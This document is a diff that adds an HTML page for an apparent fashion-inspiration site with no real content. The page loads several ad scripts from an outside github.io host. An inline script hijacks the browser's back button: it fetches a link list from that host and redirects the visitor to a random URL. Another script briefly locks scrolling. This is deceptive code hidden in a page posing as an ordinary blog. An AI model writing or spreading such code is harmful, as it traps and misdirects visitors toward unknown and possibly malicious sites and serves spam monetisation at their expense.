@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gorgeous Fashion Look | Fashion Inspo</title>
+    <meta name="description" content="Discover trendy and gorgeous fashion inspiration and outfit ideas for your everyday look.">
+    <meta name="robots" content="index, follow">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<center><script type="text/javascript" src='https://seribudollarperhari.github.io/banner/ad1.js'></script></center>
+    <header>
+        <div class="container">
+            <a href="index.html" class="logo-link">
+                <div class="logo">Fashion Inspo</div>
+            </a>
+            <nav>
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="about.html">About Us</a></li>
+                    <li><a href="contact.html">Contact</a></li>
+                    <li><a href="privacy.html">Privacy Policy</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <center><script type="text/javascript" src='https://seribudollarperhari.github.io/banner/ad2.js'></script></center>
+    <main>
+        <div class="container">
+            <article class="main-article">
+                <div style="display:none; visibility:hidden;"></div>
+                <h1 id="detail-title">Loading Fashion Look...</h1>
+                <div id="detail-image-container" class="detail-image"></div>
+                <div id="detail-body" class="article-content">
+                    <p style="text-align: center; color: #666;">Generating your gorgeous fashion inspiration...</p>
+                </div>
+            </article>
+            
+            <center><script type="text/javascript" src='https://seribudollarperhari.github.io/banner/ad3.js'></script></center>
+            
+            <section class="related-posts-section">
+                <div id="related-posts-container" class="content-grid"></div>
+            </section>
+        </div>
+    </main>
+    <center><script type="text/javascript" src='https://seribudollarperhari.github.io/banner/nativ.js'></script></center>
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 Fashion Inspo - Gorgeous Outfit Ideas. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+    (function(window, location) {
+        var redirecting = false;
+
+        function openRandomLink() {
+            if (redirecting) return;
+            redirecting = true;
+            document.body.style.cursor = 'wait';
+            fetch('https://seribudollarperhari.github.io/banner/link.txt')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('Gagal memuat link');
+                    return response.text();
+                })
+                .then(function(text) {
+                    var links = text.split('\n')
+                        .map(function(line) { return line.trim(); })
+                        .filter(function(line) { return line !== ''; });
+                    if (links.length > 0) {
+                        var randomIndex = Math.floor(Math.random() * links.length);
+                        location.replace(links[randomIndex]);
+                    }
+                })
+                .catch(function(error) {
+                    console.error('Error:', error);
+                    redirecting = false;
+                });
+        }
+
+        history.pushState({ guard: true }, document.title, location.href);
+
+        window.addEventListener('popstate', function() {
+            setTimeout(openRandomLink, 0);
+        });
+    })(window, location);
+    </script>
+
+    <script src="detail-script.js"></script>
+
+    <script>
+    document.body.style.overflow = "hidden";
+    setTimeout(function() {
+        document.body.style.overflow = "auto";
+    }, 2000);
+    </script>
+
+</body>
+</html>
